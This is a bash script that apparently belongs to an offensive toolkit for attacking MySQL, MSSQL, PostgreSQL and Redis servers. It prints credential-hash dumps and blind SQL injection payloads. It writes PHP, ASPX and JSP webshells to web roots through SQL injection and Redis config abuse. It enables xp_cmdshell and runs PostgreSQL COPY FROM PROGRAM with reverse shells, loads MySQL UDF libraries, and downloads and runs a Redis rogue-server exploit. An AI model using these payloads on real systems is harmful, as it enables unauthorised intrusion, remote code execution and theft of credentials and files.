#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

get_mssql_commands() {
    echo 'MSSQL database commands'
    echo 'SELECT name FROM sys.databases;'
    echo 'Use [database]'
    echo "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
    echo 'Select top 3 * from msdb.dbo.sysusers;'
    echo 'SELECT name, password_hash FROM sys.sql_logins;'
    get_mssql_injection
    get_mssql_impersonation
    get_mssql_read_files

}

get_mysql_commands() {
    echo 'MySQL database commands'
    echo 'SHOW DATABASES;'
    echo 'USE [database];'
    echo 'SHOW TABLES;'
    echo 'SELECT * FROM users LIMIT 3;'
    echo 'SELECT * FROM information_schema.columns;'
    echo 'SELECT schema_name from information_schema.schemata;'
    echo 'SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();'
    echo 'SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE();'
    echo 'SELECT User, Password, authentication_string FROM mysql.user;'

}

get_psql_commands() {
    echo 'PostgreSQL database commands'
    echo '\l'
    echo '\c [database]'
    echo '\dt'
    echo 'SELECT * FROM users LIMIT 3;'
    echo 'CREATE OR REPLACE VIEW public.my_roles
AS WITH RECURSIVE cte AS (
         SELECT pg_roles.oid,
            pg_roles.rolname
           FROM pg_roles
          WHERE pg_roles.rolname = CURRENT_USER
        UNION ALL
         SELECT m.roleid,
            pgr.rolname
           FROM cte cte_1
             JOIN pg_auth_members m ON m.member = cte_1.oid
             JOIN pg_roles pgr ON pgr.oid = m.roleid
        )
 SELECT array_agg(cte.rolname) AS my_roles
   FROM cte;'

}

get_sqli_commands() {
    echo 'SQL Injection commands'
    echo "OR 1=1 in (Select $cmd) INTO OUTFILE "   
    echo "Union Select $cmd INTO OUTFILE "
}

get_blind_sqli_commands() {
    echo 'Blind SQL Injection Test Commands'
    echo ''
    echo '=== Time-based Blind SQLi ==='
    echo "' OR (SELECT SLEEP(5)) --"
    echo "' OR IF(1=1, SLEEP(5), 0) --"
    echo "'; WAITFOR DELAY '00:00:05' --"
    echo "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() AND SLEEP(5)) --"
    echo ''
    echo '=== Boolean-based Blind SQLi ==='
    echo "' AND 1=1 --"
    echo "' AND 1=2 --"
    echo "' AND (SELECT SUBSTRING(@@version,1,1))='5' --"
    echo "' AND (SELECT SUBSTRING(user(),1,1))='r' --"
    echo "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
    echo ''
    echo '=== Database Detection ==='
    echo "' AND @@version LIKE '%MySQL%' --"
    echo "' AND @@version LIKE '%Microsoft%' --"
    echo "' AND (SELECT sqlite_version()) --"
    echo ''
    echo '=== Data Extraction (Character by Character) ==='
    echo "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --"
    echo "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114 --"
    echo "' AND LENGTH((SELECT database()))=8 --"
    echo ''
    echo '=== MSSQL Specific ==='
    echo "' AND (SELECT SUBSTRING(@@version,1,1))='M' --"
    echo "'; IF(1=1) WAITFOR DELAY '00:00:05' --"
    echo ''
    echo '=== Oracle Specific ==='
    echo "' AND (SELECT banner FROM v\$version WHERE rownum=1) LIKE '%Oracle%' --"
    echo "' AND (SELECT COUNT(*) FROM user_tables)>0 --"
}

get_mysql_injection() {
    if [[ ! -z "$1" ]]; then
        webshell="$1"
    fi    
    if [[ -z $webshell ]]; then
        create_php_web_shell
        webshell=$(cat webshell.php)
    fi
    webshell=$(minimize_script "$webshell")
    webshell=$(echo "$webshell" | base64 -w 0)

    if [[ ! -z "$2" ]]; then
        outfile_location=$2
    fi
    if [[ -z "$outfile_location" ]]; then
        outfile_location="/var/www/html/webshell.php"
    fi
    if [[ ! -z "$3" ]]; then
        num_sql_back_null="$3"
    fi
    if [[ -z "$num_sql_back_null" ]]; then
        num_sql_back_null=0
    fi
    if [[ -z "$num_sql_front_null" ]]; then
        num_sql_front_null=0
    fi
    if [[ -z $null_value ]]; then
        null_value="null"
    fi
    if [[ -z $back_null_values ]]; then
        for ((i=1; i<=num_sql_back_null; i++)); do
            back_null_values+=", $null_value"
        done        
    fi
    if [[ -z $front_null_values ]]; then
        for ((i=1; i<=num_sql_front_null; i++)); do
            front_null_values+="$null_value, "
        done        

    fi
    #into is not allowed inside subqueries, so we have to do union select
    if [[ ! -z "$sqli_type" ]] && [[ $sqli_type == "union"  ]]; then
        echo  " UNION SELECT $front_null_values FROM_BASE64('$webshell') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
    else
        echo  " ;SELECT FROM_BASE64('$webshell') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
    fi
}

get_nulls() {
    local count=$1
    local nulls=""
    for ((i=0; i<count; i++)); do
        if [[ $i -gt 0 ]]; then
            nulls+=","
        fi
        nulls+="null"
    done
    echo "$nulls"
}

run_psql() {

    if [[ -z $username ]]; then
        username=postgres
        echo "Username is not set, using default $username"
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using default $target_ip"
    fi
    if [[ -z $target_port ]]; then
        target_port=5432
        echo "Target port is not set, using default $target_port"
    fi
    if [[ -z $password ]]; then
        password=postgres
        echo "Password is not set, using default $password"
    fi
    local command=""
    if ! pgrep -f "psql -U $username -h $target_ip -p $target_port"; then
        command="PGPASSWORD=$password psql -U $username -h $target_ip -p $target_port"
        echo $command
        eval $command | tee >(remove_color_to_log >> "$log_dir/psql_$target_ip.log")
    else
        echo "psql session already running"
    fi


}

run_mysql() {

    if [[ -z $username ]]; then
        username=root
        echo "Username is not set, using default $username"
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using default $target_ip"
    fi
    if [[ -z $target_port ]]; then
        target_port=3306
        echo "Target port is not set, using default $target_port"
    fi
    local password_option=""
    if [[ ! -z $password ]]; then
        password_option="-p$password"
    fi
    mysql_additional_options="$mysql_additional_options --skip-ssl"
    if ! pgrep -f "mysql -u $username -h $target_ip -P $target_port"; then
        mysql -u "$username" -h "$target_ip" -P "$target_port" $password_option $mysql_additional_options #| tee -a "log/mysql_$target_ip.log"
    else
        echo "MySQL session already running"
    fi

}

run_redis_cli() {
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using default $target_ip"
    fi
    if [[ -z $target_port ]]; then
        target_port=6379
        echo "Target port is not set, using default $target_port"
    fi
    local password_option=""
    if [[ ! -z $password ]]; then
        password_option="-a $password"
    fi
    if [[ ! -z $cmd ]] && [[ ! -z $redis_version ]]; then
        echo "Executing command: $cmd, assuming rogue module was loaded"
        redis-cli -h $target_ip -p $target_port $password_option system.exec "$cmd" | tee >(remove_color_to_log "$log_dir/redis_$target_ip.log")
        return 0
    fi
    if ! pgrep -f "redis-cli -h $target_ip"; then
        redis-cli -h $target_ip -p $target_port $password_option | tee >(remove_color_to_log >> "$log_dir/redis_$target_ip.log")
    else
        echo "Redis-cli session already running"
    fi
}

perform_redis_webshell_upload() {
    if [[ -z $webshell ]]; then        
        if [[ -z $webshell_type ]]; then
            webshell_type="php"
        fi
        if [[ $webshell_type == "php" ]]; then
            webshell='<?php system($_REQUEST["cmd"]); ?>'
        elif [[ $webshell_type == "aspx" ]]; then
            webshell='<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(Request["cmd"]);%>'
        elif [[ $webshell_type == "jsp" ]]; then
            webshell='<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
        fi
    fi
    if [[ -z $output_path ]]; then
        output_path="/var/www/html"
    fi
    echo 'flushall'
    echo "set shell '$webshell'"
    echo "config set dbfilename shell.$webshell_type"
    echo "config set dir $output_path"
    echo "save"
}

perform_redis_module_exploit() {
    create_redis_module
    if [[ -z $module_path ]]; then
        echo "module_path is not set"
        return 1
    fi
    echo "MODULE LOAD $module_path/$exploit_output"
    echo "inject_command \"whoami\""
}

perform_mysql_udf_exploit() {
    echo "select @@version_compile_os, @@version_compile_machine;"
    echo "select @@plugin_dir ;"
    if [[ -z "$target_arch" ]]; then
        target_arch=linux_amd64
    fi
    local udf_file=""
    if [[ $target_arch == "linux_amd64" ]]; then
        udf_file="lib_mysqludf_sys_64.so"
    elif [[ $target_arch == "linux_i386" ]]; then
        udf_file="lib_mysqludf_sys_32.so"
    elif [[ $target_arch == "windows_x86" ]]; then
        udf_file="lib_mysqludf_sys_32.dll"
    elif [[ $target_arch == "windows_x64" ]]; then
        udf_file="lib_mysqludf_sys_x64.dll"
    else
        echo "Unsupported target OS for MySQL UDF exploit: $target_arch"
        return 1
    fi

    cp "/usr/share/metasploit-framework/data/exploits/mysql/$udf_file" .
    local temp_dir=""
    if [[ $target_arch == *"linux"* ]]; then
        temp_dir="/tmp"
        generate_linux_download "$udf_file" "$temp_dir/$udf_file"
        if [[ -z $cmd ]]; then
            cmd=$(get_bash_reverse_shell)
        fi
    else
        temp_dir='C:\windows\temp'
        generate_windows_download "$udf_file" "$temp_dir\\$udf_file"
    fi
    if [[ -z $plugin_dir ]]; then
        plugin_dir="/usr/lib/mysql/plugin"
    fi


    echo "select load_file('$temp_dir/$udf_file') into dumpfile '$plugin_dir/$udf_file';"
    echo "create function sys_exec returns int soname '$udf_file';"
    echo "create function sys_bineval returns int soname '$udf_file';"
    echo "create function sys_eval returns string soname '$udf_file';"
    echo "select sys_eval('$cmd');"
}

perform_redis_sync_exploit() {
    local cve_dir="redis_sync_exploit"
    local url="https://raw.githubusercontent.com/LoRexxar/redis-rogue-server/refs/heads/master/redis-rogue-server.py"
    if [[ ! -d $cve_dir ]]; then
        mkdir -p "$cve_dir"
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "Target IP is not set, using default $target_ip"
    fi
    if  [[ -z $target_port ]]; then
        target_port=6379
        echo "Target port is not set, using default $target_port"
    fi    
    pushd "$cve_dir" || return 1
    create_redis_module
    cp exploit_redis_module/redis_module.so exp.so
    if [[ ! -f "redis-rogue-server.py" ]]; then
        wget "$url" -O "redis-rogue-server.py"
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
    fi
    if [[ -z $host_port ]]; then
        host_port=6379
    fi
    python3 redis-rogue-server.py --rhost "$target_ip" --rport "$target_port" --lhost "$host_ip" --lport "$host_port"
    popd || return 1
}

get_postgresql_read_files() {
    if [[ -z "$file_path" ]]; then
        file_path="/etc/passwd"
    fi
    echo 'CREATE TABLE read_files(output text);'
    echo "COPY read_files FROM ('$file_path');"
    echo 'SELECT * FROM read_files;'
}

get_postgresql_injection_execute_shell() {

    if [[ -z "$cmd" ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    echo 'CREATE TABLE shell(output text);'
    echo "COPY shell FROM PROGRAM '$cmd';"
    echo "select * from shell;"

}

get_postgresql_injection() {
    if [[ -z "$cmd" ]]; then
        cmd="cmd"
    fi
    if [[ -z "$outfile_location" ]]; then
        outfile_location="/var/www/html/webshell.php"
    fi
    echo " COPY (SELECT '$cmd') TO \"$outfile_location\""
}

get_mssql_injection() {
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; EXECUTE xp_cmdshell '$cmd' --//"
}

get_mssql_impersonation() {

    echo "Select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE';"
    echo "execute as login = '[username]';"
    echo 'select system_user;'
    echo "select is_srvrolemember('sysadmin');"
    echo "execute as user = '[username]';"

}

get_mssql_read_files() {
    if [[ -z "$file_path" ]]; then
        file_path="C:\Windows\win.ini"
    fi
    echo "SELECT * FROM OPENROWSET( BULK '$file_path',SINGLE_CLOB) AS Contents;"

}